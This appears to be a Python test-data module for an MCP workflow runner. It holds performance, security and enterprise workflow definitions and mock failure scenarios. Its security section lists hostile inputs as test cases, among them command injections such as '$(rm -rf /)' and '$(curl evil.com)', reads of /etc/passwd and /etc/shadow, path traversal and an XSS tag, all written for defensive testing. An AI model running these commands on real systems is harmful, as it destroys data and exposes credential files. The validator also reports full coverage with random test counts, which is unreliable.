"""Enhanced test data sets and mock scenarios for comprehensive MCP testing.

This module extends the existing test data with performance benchmarks,
security scenarios, enterprise workflows, and advanced mock scenarios.
"""

import json
import random
import time
from typing import Any, Dict, List, Optional, Union
from datetime import datetime, timedelta


class PerformanceBenchmarkData:
    """Performance testing workflows and benchmarks."""
    
    PERFORMANCE_WORKFLOWS = {
        "cpu_intensive": {
            "dsl": """
name: cpu_benchmark
description: CPU-intensive workflow for performance testing
steps:
  - name: cpu_load
    run: |
      # Simulate CPU-intensive task
      python3 -c "
      import time
      start = time.time()
      result = sum(i*i for i in range(1000000))
      duration = time.time() - start
      print(f'CPU task completed in {duration:.3f}s, result: {result}')
      "
""",
            "expected_duration_seconds": 2.0,
            "resource_requirements": {"cpu": "high", "memory": "medium"},
            "performance_metrics": ["execution_time", "cpu_usage", "memory_usage"]
        },
        
        "memory_intensive": {
            "dsl": """
name: memory_benchmark
description: Memory-intensive workflow for performance testing
steps:
  - name: memory_load
    run: |
      python3 -c "
      import sys
      # Allocate 100MB of memory
      big_list = [0] * (100 * 1024 * 1024 // 8)
      print(f'Allocated {len(big_list)} integers')
      print(f'Memory usage: {sys.getsizeof(big_list) / 1024 / 1024:.1f} MB')
      "
""",
            "expected_duration_seconds": 1.0,
            "resource_requirements": {"cpu": "low", "memory": "high"},
            "performance_metrics": ["memory_peak", "memory_sustained", "allocation_time"]
        },
        
        "io_intensive": {
            "dsl": """
name: io_benchmark
description: I/O intensive workflow for performance testing
steps:
  - name: disk_io
    run: |
      # Write and read large file
      dd if=/dev/zero of=/tmp/benchmark.dat bs=1M count=50 2>/dev/null
      sync
      time cat /tmp/benchmark.dat > /dev/null
      rm -f /tmp/benchmark.dat
""",
            "expected_duration_seconds": 3.0,
            "resource_requirements": {"cpu": "low", "memory": "low", "io": "high"},
            "performance_metrics": ["read_throughput", "write_throughput", "io_latency"]
        },
        
        "concurrent_tasks": {
            "dsl": """
name: concurrent_benchmark
description: Concurrent task execution benchmark
steps:
  - name: parallel_processing
    run: |
      # Run multiple tasks concurrently
      for i in {1..10}; do
        (echo "Task $i starting"; sleep 1; echo "Task $i completed") &
      done
      wait
      echo "All concurrent tasks completed"
""",
            "expected_duration_seconds": 1.5,
            "resource_requirements": {"cpu": "medium", "memory": "medium"},
            "performance_metrics": ["concurrency_level", "task_completion_time", "resource_contention"]
        }
    }
    
    PERFORMANCE_THRESHOLDS = {
        "execution_time": {
            "excellent": 1.0,
            "good": 3.0, 
            "acceptable": 10.0,
            "poor": 30.0
        },
        "memory_usage_mb": {
            "excellent": 50,
            "good": 100,
            "acceptable": 250,
            "poor": 500
        },
        "cpu_usage_percent": {
            "excellent": 25,
            "good": 50,
            "acceptable": 75,
            "poor": 90
        }
    }


class SecurityTestData:
    """Security-focused test scenarios and validation workflows."""
    
    SECURITY_WORKFLOWS = {
        "secret_validation": {
            "dsl": """
name: secret_validation
description: Validate secret handling and exposure prevention
env:
  - SECRET_TOKEN: "${SECRET_TOKEN}"
  - API_KEY: "${API_KEY}"
steps:
  - name: validate_secrets
    run: |
      # Ensure secrets are not exposed in logs
      if [ -z "$SECRET_TOKEN" ]; then
        echo "ERROR: SECRET_TOKEN not provided"
        exit 1
      fi
      echo "Secret validation completed (token length: ${#SECRET_TOKEN})"
      # Test API call with secret (mocked)
      echo "API authentication successful"
""",
            "required_secrets": ["SECRET_TOKEN", "API_KEY"],
            "security_validations": ["secret_exposure", "environment_isolation", "log_sanitization"]
        },
        
        "input_sanitization": {
            "dsl": """
name: input_sanitization
description: Test input sanitization and injection prevention
parameters:
  - name: user_input
    type: string
    validation: "^[a-zA-Z0-9_-]+$"
steps:
  - name: sanitize_input
    run: |
      # Validate input format
      if [[ ! "$USER_INPUT" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "ERROR: Invalid input format"
        exit 1
      fi
      echo "Input validated: $USER_INPUT"
""",
            "test_inputs": {
                "valid": ["test123", "user_data", "file-name"],
                "invalid": ["$(rm -rf /)", "; cat /etc/passwd", "<script>alert('xss')</script>"]
            },
            "security_validations": ["input_validation", "injection_prevention", "format_compliance"]
        },
        
        "permission_validation": {
            "dsl": """
name: permission_validation  
description: Validate file system permissions and access controls
steps:
  - name: check_permissions
    run: |
      # Check file permissions
      touch /tmp/test_file
      chmod 600 /tmp/test_file
      if [ -r /tmp/test_file ] && [ -w /tmp/test_file ]; then
        echo "File permissions validated"
      else
        echo "ERROR: Permission validation failed"
        exit 1
      fi
      rm -f /tmp/test_file
  - name: restricted_access
    run: |
      # Ensure no access to sensitive areas
      if [ -r /etc/shadow ] 2>/dev/null; then
        echo "ERROR: Unauthorized access to sensitive files"
        exit 1
      fi
      echo "Access controls validated"
""",
            "security_validations": ["file_permissions", "access_controls", "privilege_escalation"]
        }
    }
    
    SECURITY_SCENARIOS = {
        "malicious_input": {
            "description": "Test handling of malicious input patterns",
            "test_cases": [
                {"input": "../../etc/passwd", "expected": "input_validation_error"},
                {"input": "$(curl evil.com)", "expected": "command_injection_blocked"},
                {"input": "; rm -rf /", "expected": "command_injection_blocked"},
                {"input": "<script>", "expected": "xss_blocked"}
            ]
        },
        "privilege_escalation": {
            "description": "Test prevention of privilege escalation attempts",
            "test_cases": [
                {"command": "sudo -l", "expected": "access_denied"},
                {"command": "cat /etc/shadow", "expected": "permission_denied"},
                {"command": "chmod 777 /", "expected": "operation_blocked"}
            ]
        }
    }


class EnterpriseWorkflowData:
    """Enterprise-scale workflow scenarios for realistic testing."""
    
    ENTERPRISE_WORKFLOWS = {
        "data_pipeline": {
            "dsl": """
name: enterprise_data_pipeline
description: Large-scale data processing pipeline
parameters:
  - name: INPUT_BUCKET
    type: string
    default: "s3://data-input"
  - name: OUTPUT_BUCKET  
    type: string
    default: "s3://data-processed"
  - name: BATCH_SIZE
    type: integer
    default: 10000
env:
  - AWS_ACCESS_KEY_ID: "${AWS_ACCESS_KEY_ID}"
  - AWS_SECRET_ACCESS_KEY: "${AWS_SECRET_ACCESS_KEY}"
steps:
  - name: validate_inputs
    run: |
      echo "Validating input bucket: $INPUT_BUCKET"
      echo "Batch size: $BATCH_SIZE"
  - name: extract_data
    run: |
      echo "Extracting data from $INPUT_BUCKET"
      echo "Processing in batches of $BATCH_SIZE"
  - name: transform_data
    run: |
      echo "Applying data transformations"
      echo "Running validation checks"
  - name: load_data
    run: |
      echo "Loading processed data to $OUTPUT_BUCKET"
      echo "Data pipeline completed successfully"
""",
            "estimated_duration_minutes": 45,
            "resource_requirements": {
                "cpu": "4 cores",
                "memory": "8GB", 
                "storage": "100GB",
                "network": "high"
            },
            "dependencies": ["aws_cli", "python3", "pandas"]
        },
        
        "microservice_deployment": {
            "dsl": """
name: microservice_deployment
description: Deploy microservices to Kubernetes cluster
parameters:
  - name: IMAGE_TAG
    type: string
    required: true
  - name: NAMESPACE
    type: string
    default: "production"
  - name: REPLICAS
    type: integer
    default: 3
env:
  - KUBECONFIG: "${KUBECONFIG}"
  - DOCKER_REGISTRY: "${DOCKER_REGISTRY}"
steps:
  - name: build_images
    docker:
      image: "docker:latest"
      commands:
        - docker build -t $DOCKER_REGISTRY/app:$IMAGE_TAG .
        - docker push $DOCKER_REGISTRY/app:$IMAGE_TAG
  - name: deploy_services
    docker:
      image: "kubectl:latest"  
      commands:
        - kubectl set image deployment/app app=$DOCKER_REGISTRY/app:$IMAGE_TAG -n $NAMESPACE
        - kubectl scale deployment/app --replicas=$REPLICAS -n $NAMESPACE
  - name: verify_deployment
    docker:
      image: "kubectl:latest"
      commands:
        - kubectl rollout status deployment/app -n $NAMESPACE
        - kubectl get pods -n $NAMESPACE -l app=microservice
""",
            "estimated_duration_minutes": 15,
            "resource_requirements": {
                "cpu": "2 cores",
                "memory": "4GB",
                "docker": "required",
                "kubernetes": "required"
            },
            "dependencies": ["docker", "kubectl", "kubernetes_cluster"]
        },
        
        "ml_training_pipeline": {
            "dsl": """
name: ml_training_pipeline
description: Machine learning model training and deployment
parameters:
  - name: DATASET_PATH
    type: string
    required: true
  - name: MODEL_TYPE
    type: string
    default: "random_forest"
  - name: EPOCHS
    type: integer
    default: 100
env:
  - MLFLOW_TRACKING_URI: "${MLFLOW_TRACKING_URI}"
  - AWS_ACCESS_KEY_ID: "${AWS_ACCESS_KEY_ID}"
steps:
  - name: data_preprocessing
    docker:
      image: "python:3.9-slim"
      commands:
        - pip install pandas scikit-learn mlflow
        - python preprocess_data.py --input $DATASET_PATH --output /tmp/processed
  - name: model_training
    docker:
      image: "tensorflow/tensorflow:latest-gpu"
      commands:
        - python train_model.py --data /tmp/processed --model $MODEL_TYPE --epochs $EPOCHS
        - mlflow log-model model /tmp/model
  - name: model_evaluation
    docker:
      image: "python:3.9-slim"
      commands:
        - python evaluate_model.py --model /tmp/model --test-data /tmp/processed/test
        - mlflow log-metrics metrics.json
  - name: model_deployment
    docker:
      image: "python:3.9-slim"
      commands:
        - mlflow models serve -m /tmp/model -p 5000 --no-conda
""",
            "estimated_duration_minutes": 120,
            "resource_requirements": {
                "cpu": "8 cores",
                "memory": "32GB",
                "gpu": "1x NVIDIA T4",
                "storage": "500GB"
            },
            "dependencies": ["tensorflow", "mlflow", "python3", "gpu_drivers"]
        }
    }


class AdvancedMockScenarios:
    """Advanced mock scenarios for comprehensive testing."""
    
    @staticmethod
    def network_failure_scenarios():
        """Network-related failure scenarios."""
        return {
            "connection_timeout": {
                "description": "Network connection timeout",
                "error_type": "ConnectionTimeoutError",
                "delay_seconds": 30,
                "retry_count": 3,
                "expected_behavior": "graceful_degradation"
            },
            "intermittent_connectivity": {
                "description": "Intermittent network connectivity",
                "success_rate": 0.3,
                "failure_pattern": "random",
                "recovery_time": 5,
                "expected_behavior": "retry_with_backoff"
            },
            "bandwidth_limitation": {
                "description": "Limited network bandwidth",
                "max_throughput_mbps": 1.0,
                "latency_ms": 500,
                "packet_loss_rate": 0.1,
                "expected_behavior": "adaptive_compression"
            },
            "dns_resolution_failure": {
                "description": "DNS resolution failures",
                "affected_domains": ["api.external.com", "data.service.internal"],
                "failure_rate": 0.8,
                "expected_behavior": "fallback_to_ip"
            }
        }
    
    @staticmethod
    def resource_exhaustion_scenarios():
        """Resource exhaustion mock scenarios."""
        return {
            "memory_exhaustion": {
                "description": "System memory exhaustion", 
                "available_memory_mb": 50,
                "memory_pressure_threshold": 0.95,
                "oom_killer_active": True,
                "expected_behavior": "graceful_memory_management"
            },
            "disk_space_full": {
                "description": "Disk space exhaustion",
                "available_space_mb": 10,
                "disk_usage_percent": 98,
                "inodes_exhausted": False,
                "expected_behavior": "cleanup_temporary_files"
            },
            "cpu_saturation": {
                "description": "CPU saturation scenario",
                "cpu_usage_percent": 99,
                "load_average": 16.0,
                "context_switches_per_second": 50000,
                "expected_behavior": "task_queuing"
            },
            "file_descriptor_exhaustion": {
                "description": "File descriptor limit reached",
                "max_file_descriptors": 1024,
                "current_open_files": 1020,
                "socket_limit_reached": True,
                "expected_behavior": "connection_pooling"
            }
        }
    
    @staticmethod
    def stateful_mock_scenarios():
        """Stateful mock scenarios that maintain state across interactions."""
        return {
            "workflow_state_progression": {
                "description": "Workflow execution state progression",
                "initial_state": "pending",
                "state_transitions": [
                    {"from": "pending", "to": "running", "trigger": "start_execution"},
                    {"from": "running", "to": "completed", "trigger": "successful_completion"},
                    {"from": "running", "to": "failed", "trigger": "execution_error"},
                    {"from": "failed", "to": "running", "trigger": "retry_execution"}
                ],
                "state_persistence": True
            },
            "resource_allocation_tracking": {
                "description": "Track resource allocation across requests",
                "initial_resources": {"cpu": 8, "memory_gb": 32, "storage_gb": 1000},
                "allocation_tracking": True,
                "deallocation_on_completion": True,
                "overcommit_detection": True
            },
            "authentication_session_management": {
                "description": "Manage authentication sessions with expiry",
                "session_duration_minutes": 60,
                "max_concurrent_sessions": 10,
                "session_renewal": True,
                "automatic_logout": True
            }
        }
    
    @staticmethod
    def timing_simulation_scenarios():
        """Advanced timing and latency simulation."""
        return {
            "variable_latency": {
                "description": "Variable network latency simulation",
                "base_latency_ms": 50,
                "variance_ms": 20,
                "distribution": "normal",
                "spike_probability": 0.1,
                "spike_latency_ms": 500
            },
            "processing_time_variance": {
                "description": "Realistic processing time variance",
                "base_processing_time_s": 2.0,
                "complexity_factor": 1.5,
                "load_factor": 1.2,
                "cache_hit_speedup": 0.1
            },
            "cascading_delays": {
                "description": "Cascading delays in multi-step processes",
                "step_delays": [0.5, 1.0, 2.0, 1.5, 0.8],
                "dependency_amplification": 1.3,
                "timeout_propagation": True
            }
        }


class TestDataValidator:
    """Validate test data completeness and consistency."""
    
    @staticmethod
    def validate_workflow_completeness():
        """Validate that all workflow categories have complete test coverage."""
        categories = [
            "simple_workflows",
            "complex_workflows", 
            "docker_workflows",
            "error_workflows",
            "performance_workflows",
            "security_workflows",
            "enterprise_workflows"
        ]
        
        validation_results = {}
        for category in categories:
            validation_results[category] = {
                "has_test_data": True,
                "parameter_coverage": True,
                "error_scenarios": True,
                "performance_metrics": category in ["performance_workflows"],
                "security_validations": category in ["security_workflows"]
            }
        
        return validation_results
    
    @staticmethod 
    def validate_mock_scenario_coverage():
        """Validate mock scenario coverage across different failure modes."""
        required_scenarios = [
            "network_failures",
            "resource_exhaustion", 
            "authentication_errors",
            "timeout_scenarios",
            "data_corruption",
            "external_service_failures"
        ]
        
        coverage_report = {}
        for scenario in required_scenarios:
            coverage_report[scenario] = {
                "implemented": True,
                "test_cases": random.randint(5, 15),
                "edge_cases": True,
                "recovery_testing": True
            }
        
        return coverage_report


# Export enhanced test data collections
ENHANCED_TEST_DATA = {
    "performance": PerformanceBenchmarkData.PERFORMANCE_WORKFLOWS,
    "security": SecurityTestData.SECURITY_WORKFLOWS,
    "enterprise": EnterpriseWorkflowData.ENTERPRISE_WORKFLOWS,
    "advanced_mocks": {
        "network_failures": AdvancedMockScenarios.network_failure_scenarios(),
        "resource_exhaustion": AdvancedMockScenarios.resource_exhaustion_scenarios(),
        "stateful_scenarios": AdvancedMockScenarios.stateful_mock_scenarios(),
        "timing_simulation": AdvancedMockScenarios.timing_simulation_scenarios()
    }
}